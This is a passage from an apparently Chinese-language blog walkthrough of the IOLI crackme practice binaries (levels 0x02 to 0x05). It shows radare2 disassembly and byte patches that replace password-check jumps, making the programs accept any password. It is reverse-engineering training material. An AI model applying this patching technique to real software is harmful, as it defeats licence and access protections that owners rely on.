- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x08048451</span>  <span class="number">9090</span> c704 <span class="number">246f</span> <span class="number">8504</span> <span class="number">08e8</span>                 ....$o....      
[<span class="number">0x08048451</span>]&gt; q
</code></pre><p>输入任何密码：</p>
<pre><code> <span class="regexp">~/Work/</span>project<span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x02
IOLI Crackme Level <span class="number">0x02</span>
<span class="string">Password:</span> <span class="number">12345</span>
Password <span class="string">OK :</span>)
</code></pre><h2 id="crackme0x03">crackme0x03</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x03
IOLI Crackme Level <span class="number">0</span>x03
Password: <span class="number">12345</span>
Invalid Password!
</code></pre><p>这回发现难一些了，没有明文字符串。main函数调用一个<code>test</code>，<code>test</code>又调用<code>shift</code>。虽然不知道这些函数是干嘛的。但发现<code>sym.test</code>中有两个似乎加密过的字符串，可能对应<code>invalid</code>和<code>Ok</code>两个字符串。</p>
<p>猜测<code>sym.shift</code>是一种移位加密方法。</p>
<p>基本上可以猜出来<code>0x0804848a</code>是<code>OK</code>的地方</p>
<pre><code> ✘ ⮀ ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x03
 -- Use zoom.byte=entropy and press <span class="string">'z'</span> in visual mode to zoom out to see the entropy of the whole file
[<span class="number">0x08048360</span>]&gt; aa
[<span class="number">0x08048360</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x0804847a</span> (unk)
|          ; DATA XREF from <span class="number">0x08048377</span> (fcn<span class="number">.08048356</span>)
/ (fcn) sym.main <span class="number">128</span>
|          <span class="number">0x08048498</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048499</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804849b</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x0804849e</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a1</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x080484a6</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080484a9</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x080484ac</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x080484af</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x080484b2</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x080484b4</span>    c7042410860. mov dword [esp], str.IOLI_Crackme_Level_0x03_n ; str.IOLI_Crackme_Level_0x03_n
|          <span class="number">0x080484bb</span>    e890feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x080484c0</span>    c7042429860. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x080484c7</span>    e884feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x080484cc</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x080484cf</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080484d3</span>    c7042434860. mov dword [esp], <span class="number">0x8048634</span> ;  <span class="number">0x08048634</span> 
|          <span class="number">0x080484da</span>    e851feffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x080484df</span>    c745f85a000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x5a</span> ;  <span class="number">0x0000005a</span> 
|          <span class="number">0x080484e6</span>    c745f4ec010. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x1ec</span> ;  <span class="number">0x000001ec</span> 
|          <span class="number">0x080484ed</span>    <span class="number">8</span>b55f4       mov edx, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x080484f0</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484f3</span>    <span class="number">0110</span>         add [eax], edx
|          <span class="number">0x080484f5</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484f8</span>    <span class="number">0f</span>af45f8     imul eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080484fc</span>    <span class="number">8945f</span>4       mov [ebp-<span class="number">0xc</span>], eax
|          <span class="number">0x080484ff</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|          <span class="number">0x08048502</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x08048506</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x08048509</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804850c</span>    e85dffffff   call sym.test
|             sym.test()
|          <span class="number">0x08048511</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048516</span>    c9           leave
\          <span class="number">0x08048517</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; pdf@sym.test
|          ; UNKNOWN XREF from <span class="number">0x0804846e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804850c</span> (unk)
/ (fcn) sym.test <span class="number">42</span>
|          <span class="number">0x0804846e</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804846f</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048471</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x08048474</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048477</span>    <span class="number">3</span>b450c       cmp eax, [ebp+<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x0804847a</span>    <span class="number">740</span>e         je loc<span class="number">.0804848</span>a
|      |   <span class="number">0x0804847c</span>    c70424ec850. mov dword [esp], str.Lqydolg_Sdvvzrug_ ; str.Lqydolg_Sdvvzrug_
|      |   <span class="number">0x08048483</span>    e88cffffff   call sym.shift
|      |      sym.shift(unk)
|     ,==&lt; <span class="number">0x08048488</span>    eb0c         jmp loc<span class="number">.08048496</span>
|     ||   ; JMP XREF from <span class="number">0x0804847a</span> (unk)
|- loc<span class="number">.0804848</span>a <span class="number">14</span>
|     |`-&gt; <span class="number">0x0804848a</span>    c70424fe850. mov dword [esp], str.Sdvvzrug_RN______ ; str.Sdvvzrug_RN______
|     |    <span class="number">0x08048491</span>    e87effffff   call sym.shift
|     |       sym.shift()
|     |    ; JMP XREF from <span class="number">0x08048488</span> (unk)
|- loc<span class="number">.08048496</span> <span class="number">2</span>
|     `--&gt; <span class="number">0x08048496</span>    c9           leave
\          <span class="number">0x08048497</span>    c3           ret
[<span class="number">0x08048360</span>]&gt; s <span class="number">0x0804847a</span>
[<span class="number">0x0804847a</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847a</span>  <span class="number">7400</span> <span class="number">0000</span> <span class="number">24</span>ec <span class="number">8504</span> <span class="number">08e8</span> <span class="number">8</span>cff ffff eb0c  t...$...........
<span class="number">0x0804848a</span>  c704 <span class="number">24f</span>e                                ..$.            
[<span class="number">0x0804847a</span>]&gt; wx eb
[<span class="number">0x0804847a</span>]&gt; px <span class="number">20</span>
- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
<span class="number">0x0804847a</span>  eb0e c704 <span class="number">24</span>ec <span class="number">8504</span> <span class="number">08e8</span> <span class="number">8</span>cff ffff eb0c  ....$...........
<span class="number">0x0804848a</span>  c704 <span class="number">24f</span>e                                ..$.            
[<span class="number">0x0804847a</span>]&gt; pdf@sym.test
|          ; UNKNOWN XREF from <span class="number">0x0804846e</span> (unk)
|          ; CALL XREF from <span class="number">0x0804850c</span> (unk)
/ (fcn) sym.test <span class="number">42</span>
|          <span class="number">0x0804846e</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804846f</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048471</span>    <span class="number">83</span>ec08       sub esp, <span class="number">0x8</span>
|          <span class="number">0x08048474</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x08048477</span>    <span class="number">3</span>b450c       cmp eax, [ebp+<span class="number">0xc</span>]
|      ,=&lt; <span class="number">0x0804847a</span>    eb0e         jmp loc<span class="number">.0804848</span>a
|      |   <span class="number">0x0804847c</span>    c70424ec850. mov dword [esp], str.Lqydolg_Sdvvzrug_ ; str.Lqydolg_Sdvvzrug_
|      |   <span class="number">0x08048483</span>    e88cffffff   call sym.shift
|      |      sym.shift(unk)
|     ,==&lt; <span class="number">0x08048488</span>    eb0c         jmp loc<span class="number">.08048496</span>
|     ||   ; JMP XREF from <span class="number">0x0804847a</span> (unk)
|- loc<span class="number">.0804848</span>a <span class="number">14</span>
|     |`-&gt; <span class="number">0x0804848a</span>    c70424fe850. mov dword [esp], str.Sdvvzrug_RN______ ; str.Sdvvzrug_RN______
|     |    <span class="number">0x08048491</span>    e87effffff   call sym.shift
|     |       sym.shift()
|     |    ; JMP XREF from <span class="number">0x08048488</span> (unk)
|- loc<span class="number">.08048496</span> <span class="number">2</span>
|     `--&gt; <span class="number">0x08048496</span>    c9           leave
\          <span class="number">0x08048497</span>    c3           ret
[<span class="number">0x0804847a</span>]&gt; q
</code></pre><p>输入任意密码</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x03                
IOLI Crackme Level <span class="number">0</span>x03
Password: <span class="number">12345</span>
Password OK!!! :)
</code></pre><h2 id="crackme0x04">crackme0x04</h2><p>尝试12345竟然成功了……这不重要，README中给出了所有crackme的密码方便破解。</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x04
IOLI Crackme Level <span class="number">0</span>x04
Password: aaaaa
Password Incorrect!
</code></pre><p>又一个叫<code>sym.check</code>的函数，里头赫然写着明文的<code>invalid</code>和<code>ok</code>。仍然是将判断跳转改成什么都不做。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ <span class="literal">r2</span> -w ./crackme0x04
 -- Interpret your own radare2 scripts with <span class="string">'. &lt;path-to-your-script&gt;'</span>. Similar to the bash source alias command.
[<span class="number">0x080483d0</span>]&gt; aa
[<span class="number">0x080483d0</span>]&gt; pdf@sym.main
|          <span class="comment">; UNKNOWN XREF from 0x08048509 (unk)</span>
|          <span class="comment">; DATA XREF from 0x080483e7 (fcn.080483ba)</span>
/ (fcn) sym.main <span class="number">92</span>
|          <span class="number">0x08048509</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804850a</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804850c</span>    81ec88000000 <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x88</span>
|          <span class="number">0x08048512</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x08048515</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x0804851a</span>    83c00f       <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xf</span>
|          <span class="number">0x0804851d</span>    83c00f       <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xf</span>
|          <span class="number">0x08048520</span>    c1e804       <span class="keyword">shr</span> <span class="literal">eax</span>, <span class="number">0x4</span>
|          <span class="number">0x08048523</span>    c1e004       <span class="keyword">shl</span> <span class="literal">eax</span>, <span class="number">0x4</span>
|          <span class="number">0x08048526</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
|          <span class="number">0x08048528</span>    c704245e860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.IOLI_Crackme_Level_0x04_n <span class="comment">; str.IOLI_Crackme_Level_0x04_n</span>
|          <span class="number">0x0804852f</span>    e860feffff   <span class="keyword">call</span> sym.imp.printf
|             sym.imp.printf(unk)
|          <span class="number">0x08048534</span>    c7042477860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.Password_ <span class="comment">; str.Password_</span>
|          <span class="number">0x0804853b</span>    e854feffff   <span class="keyword">call</span> sym.imp.printf
|             sym.imp.printf()
|          <span class="number">0x08048540</span>    8d4588       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x78</span>]
|          <span class="number">0x08048543</span>    <span class="number">89442404</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="literal">eax</span>
|          <span class="number">0x08048547</span>    c7042482860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="number">0x8048682</span> <span class="comment">;  0x08048682 </span>
|          <span class="number">0x0804854e</span>    e821feffff   <span class="keyword">call</span> sym.imp.scanf
|             sym.imp.scanf()
|          <span class="number">0x08048553</span>    8d4588       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x78</span>]
|          <span class="number">0x08048556</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|          <span class="number">0x08048559</span>    e826ffffff   <span class="keyword">call</span> sym.check
|             sym.check()
|          <span class="number">0x0804855e</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x08048563</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x08048564</span>    c3           <span class="keyword">ret</span>
[<span class="number">0x080483d0</span>]&gt; pdf@sym.check
|          <span class="comment">; CALL XREF from 0x08048559 (unk)</span>
/ (fcn) sym.check <span class="number">133</span>
|          <span class="number">0x08048484</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x08048485</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x08048487</span>    83ec28       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x28</span>
|          <span class="number">0x0804848a</span>    c745f800000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0x8</span>], <span class="number">0x0</span>
|          <span class="number">0x08048491</span>    c745f400000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>], <span class="number">0x0</span>
|    .---&gt; <span class="number">0x08048498</span>    8b4508       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x8</span>]
|    |     <span class="number">0x0804849b</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|    |     <span class="number">0x0804849e</span>    e8e1feffff   <span class="keyword">call</span> sym.imp.strlen <span class="comment">; (fcn.0804837a)</span>
|    |        fcn.0804837a(unk) <span class="comment">; sym.imp.strlen</span>
|    |     <span class="number">0x080484a3</span>    3945f4       <span class="keyword">cmp</span> [<span class="literal">ebp</span>-<span class="number">0xc</span>], <span class="literal">eax</span>
|    | ,=&lt; <span class="number">0x080484a6</span>    <span class="number">7353</span>         <span class="keyword">jae</span> <span class="number">0x80484fb</span>
|    | |   <span class="number">0x080484a8</span>    8b45f4       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0xc</span>]
|    | |   <span class="number">0x080484ab</span>    <span class="number">034508</span>       <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x8</span>]
|    | |   <span class="number">0x080484ae</span>    0fb600       <span class="keyword">movzx</span> <span class="literal">eax</span>, <span class="preprocessor">byte</span> [<span class="literal">eax</span>]
|    | |   <span class="number">0x080484b1</span>    8845f3       <span class="keyword">mov</span> [<span class="literal">ebp</span>-<span class="number">0xd</span>], <span class="literal">al</span>
|    | |   <span class="number">0x080484b4</span>    8d45fc       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x4</span>]
|    | |   <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|    | |   <span class="number">0x080484bb</span>    c7442404388. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="number">0x8048638</span> <span class="comment">;  0x08048638 </span>
|    | |   <span class="number">0x080484c3</span>    8d45f3       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0xd</span>]
|    | |   <span class="number">0x080484c6</span>    <span class="number">890424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">eax</span>
|    | |   <span class="number">0x080484c9</span>    e8d6feffff   <span class="keyword">call</span> sym.imp.sscanf <span class="comment">; (fcn.0804839a)</span>
|    | |      fcn.0804839a() <span class="comment">; sym.imp.sscanf</span>
|    | |   <span class="number">0x080484ce</span>    8b55fc       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">ebp</span>-<span class="number">0x4</span>]
|    | |   <span class="number">0x080484d1</span>    8d45f8       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>-<span class="number">0x8</span>]
|    | |   <span class="number">0x080484d4</span>    <span class="number">0110</span>         <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">edx</span>
|    | |   <span class="number">0x080484d6</span>    837df80f     <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>-<span class="number">0x8</span>], <span class="number">0xf</span>
|    |,==&lt; <span class="number">0x080484da</span>    <span class="number">7518</span>         <span class="keyword">jne</span> <span class="number">0x80484f4</span>
|    |||   <span class="number">0x080484dc</span>    c704243b860. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="keyword">str</span>.Password_OK__n <span class="comment">; str.Password_OK__n</span>
|    |||   <span class="number">0x080484e3</span>    e8acfeffff   <span class="keyword">call</span> sym.imp.printf
|    |||      sym.imp.printf()
|    |||   <span class="number">0x080484e8</span>    c7042400000. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], <span class="number">0x0</span>
|    |||   <span class="number">0x080484ef</span>    e8c0feffff   <span class="keyword">call</span> sym.imp.exit <span class="comment">; (fcn.080483aa)</span>
|    |||      fcn.080483aa() <span class="comment">; sym.imp.exit</span>
|    |<span class="string">`--&gt; 0x080484f4    8d45f4       lea eax, [ebp-0xc]
|    | |   0x080484f7    ff00         inc dword [eax]
|    `</span>===&lt; <span class="number">0x080484f9</span>    eb9d         <span class="keyword">jmp</span> <span class="number">0x8048498</span> <span class="comment">; (sym.check)</span>
|      |   <span class="comment">; JMP XREF from 0x080484a6 (unk)</span>
|      <span class="string">`-&gt; 0x080484fb    c7042449860. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          0x08048502    e88dfeffff   call sym.imp.printf
|             sym.imp.printf()
|          0x08048507    c9           leave
\          0x08048508    c3           ret
[0x080483d0]&gt; s 0x080484da
[0x080484da]&gt; wx 9090
[0x080484da]&gt; q</span>
</code></pre><p>输入任何密码：</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x04
IOLI Crackme Level <span class="number">0</span>x04
Password: aaaaa
Password OK!
</code></pre><h2 id="crackme0x05">crackme0x05</h2><pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse/</span>IOLI-crackme<span class="regexp">/bin-linux ⮀ ./</span>crackme0x05
IOLI Crackme Level <span class="number">0</span>x05
Password: <span class="number">12345</span>
Password Incorrect!
</code></pre><p><code>sym.parell</code>? 在三个地方都有判断，更改到让程序直接执行到<code>OK</code>字符串位置。</p>
<pre><code> ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ r2 -w ./crackme0x05
 -- Use -e bin.strings=<span class="literal">false</span> to disable search <span class="keyword">for</span> strings when loading the binary.
[<span class="number">0x080483d0</span>]&gt; aa
[<span class="number">0x080483d0</span>]&gt; pdf@sym.main
|          ; UNKNOWN XREF from <span class="number">0x080484ea</span> (unk)
|          ; DATA XREF from <span class="number">0x080483e7</span> (fcn<span class="number">.080483</span>ba)
/ (fcn) sym.main <span class="number">92</span>
|          <span class="number">0x08048540</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048541</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048543</span>    <span class="number">81</span>ec88000000 sub esp, <span class="number">0x88</span>
|          <span class="number">0x08048549</span>    <span class="number">83e4</span>f0       and esp, <span class="number">0xfffffff0</span>
|          <span class="number">0x0804854c</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x08048551</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048554</span>    <span class="number">83</span>c00f       add eax, <span class="number">0xf</span>
|          <span class="number">0x08048557</span>    c1e804       shr eax, <span class="number">0x4</span>
|          <span class="number">0x0804855a</span>    c1e004       shl eax, <span class="number">0x4</span>
|          <span class="number">0x0804855d</span>    <span class="number">29</span>c4         sub esp, eax
|          <span class="number">0x0804855f</span>    c704248e860. mov dword [esp], str.IOLI_Crackme_Level_0x05_n ; str.IOLI_Crackme_Level_0x05_n
|          <span class="number">0x08048566</span>    e829feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>(unk)
|          <span class="number">0x0804856b</span>    c70424a7860. mov dword [esp], str.Password_ ; str.Password_
|          <span class="number">0x08048572</span>    e81dfeffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x08048577</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804857a</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x0804857e</span>    c70424b2860. mov dword [esp], <span class="number">0x80486b2</span> ;  <span class="number">0x080486b2</span> 
|          <span class="number">0x08048585</span>    e8eafdffff   call sym.imp.<span class="built_in">scanf</span>
|             sym.imp.<span class="built_in">scanf</span>()
|          <span class="number">0x0804858a</span>    <span class="number">8</span>d4588       lea eax, [ebp-<span class="number">0x78</span>]
|          <span class="number">0x0804858d</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x08048590</span>    e833ffffff   call sym.check
|             sym.check()
|          <span class="number">0x08048595</span>    b800000000   mov eax, <span class="number">0x0</span>
|          <span class="number">0x0804859a</span>    c9           leave
\          <span class="number">0x0804859b</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; pdf@sym.check 
|   |      ; UNKNOWN XREF from <span class="number">0x080484c8</span> (unk)
|   |      ; CALL XREF from <span class="number">0x08048590</span> (unk)
/ (fcn) sym.check <span class="number">120</span>
|   |      <span class="number">0x080484c8</span>    <span class="number">55</span>           push ebp
|   |      <span class="number">0x080484c9</span>    <span class="number">89e5</span>         mov ebp, esp
|   |      <span class="number">0x080484cb</span>    <span class="number">83</span>ec28       sub esp, <span class="number">0x28</span>
|   |      <span class="number">0x080484ce</span>    c745f800000. mov dword [ebp-<span class="number">0x8</span>], <span class="number">0x0</span>
|   |      <span class="number">0x080484d5</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|   |      ; JMP XREF from <span class="number">0x08048530</span> (unk)
|- loc<span class="number">.080484</span>dc <span class="number">100</span>
|   |.---&gt; <span class="number">0x080484dc</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|   ||     <span class="number">0x080484df</span>    <span class="number">890424</span>       mov [esp], eax
|   ||     <span class="number">0x080484e2</span>    e89dfeffff   call sym.imp.<span class="built_in">strlen</span>
|   ||        sym.imp.<span class="built_in">strlen</span>(unk)
|   ||     <span class="number">0x080484e7</span>    <span class="number">3945f</span>4       cmp [ebp-<span class="number">0xc</span>], eax
|   || ,=&lt; <span class="number">0x080484ea</span>    <span class="number">7346</span>         jae loc<span class="number">.08048532</span>
|   || |   <span class="number">0x080484ec</span>    <span class="number">8</span>b45f4       mov eax, [ebp-<span class="number">0xc</span>]
|   || |   <span class="number">0x080484ef</span>    <span class="number">034508</span>       add eax, [ebp+<span class="number">0x8</span>]
|   || |   <span class="number">0x080484f2</span>    <span class="number">0f</span>b600       movzx eax, byte [eax]
|   || |   <span class="number">0x080484f5</span>    <span class="number">8845f</span>3       mov [ebp-<span class="number">0xd</span>], al
|   || |   <span class="number">0x080484f8</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|   || |   <span class="number">0x080484fb</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|   || |   <span class="number">0x080484ff</span>    c7442404688. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x8048668</span> ;  <span class="number">0x08048668</span> 
|   || |   <span class="number">0x08048507</span>    <span class="number">8</span>d45f3       lea eax, [ebp-<span class="number">0xd</span>]
|   || |   <span class="number">0x0804850a</span>    <span class="number">890424</span>       mov [esp], eax
|   || |   <span class="number">0x0804850d</span>    e892feffff   call sym.imp.<span class="built_in">sscanf</span>
|   || |      sym.imp.<span class="built_in">sscanf</span>()
|   || |   <span class="number">0x08048512</span>    <span class="number">8</span>b55fc       mov edx, [ebp-<span class="number">0x4</span>]
|   || |   <span class="number">0x08048515</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|   || |   <span class="number">0x08048518</span>    <span class="number">0110</span>         add [eax], edx
|   || |   <span class="number">0x0804851a</span>    <span class="number">837</span>df810     cmp dword [ebp-<span class="number">0x8</span>], <span class="number">0x10</span>
|   ||,==&lt; <span class="number">0x0804851e</span>    <span class="number">750</span>b         jne loc<span class="number">.0804852</span>b
|   ||||   <span class="number">0x08048520</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|   ||||   <span class="number">0x08048523</span>    <span class="number">890424</span>       mov [esp], eax
|   ||||   <span class="number">0x08048526</span>    e859ffffff   call sym.parell
|   ||||      sym.parell()
|   |||    ; JMP XREF from <span class="number">0x0804851e</span> (unk)
|- loc<span class="number">.0804852</span>b <span class="number">21</span>
|   ||`--&gt; <span class="number">0x0804852b</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|   || |   <span class="number">0x0804852e</span>    ff00         inc dword [eax]
|   |`===&lt; <span class="number">0x08048530</span>    ebaa         jmp loc<span class="number">.080484</span>dc
|   |  |   ; JMP XREF from <span class="number">0x080484ea</span> (unk)
|- loc<span class="number">.08048532</span> <span class="number">14</span>
|   |  `-&gt; <span class="number">0x08048532</span>    c7042479860. mov dword [esp], str.Password_Incorrect__n ; str.Password_Incorrect__n
|          <span class="number">0x08048539</span>    e856feffff   call sym.imp.<span class="built_in">printf</span>
|             sym.imp.<span class="built_in">printf</span>()
|          <span class="number">0x0804853e</span>    c9           leave
\          <span class="number">0x0804853f</span>    c3           ret
[<span class="number">0x080483d0</span>]&gt; pdf@sym.parell 
|          ; CALL XREF from <span class="number">0x08048526</span> (unk)
/ (fcn) sym.parell <span class="number">68</span>
|          <span class="number">0x08048484</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x08048485</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x08048487</span>    <span class="number">83</span>ec18       sub esp, <span class="number">0x18</span>
|          <span class="number">0x0804848a</span>    <span class="number">8</span>d45fc       lea eax, [ebp-<span class="number">0x4</span>]
|          <span class="number">0x0804848d</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x08048491</span>    c7442404688. mov dword [esp+<span class="number">0x4</span>], <span class="number">0x8048668</span> ;  <span class="number">0x08048668</span> 
|          <span class="number">0x08048499</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x0804849c</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x0804849f</span>    e800ffffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>(unk)
|          <span class="number">0x080484a4</span>    <span class="number">8</span>b45fc       mov eax, [ebp-<span class="number">0x4</span>]
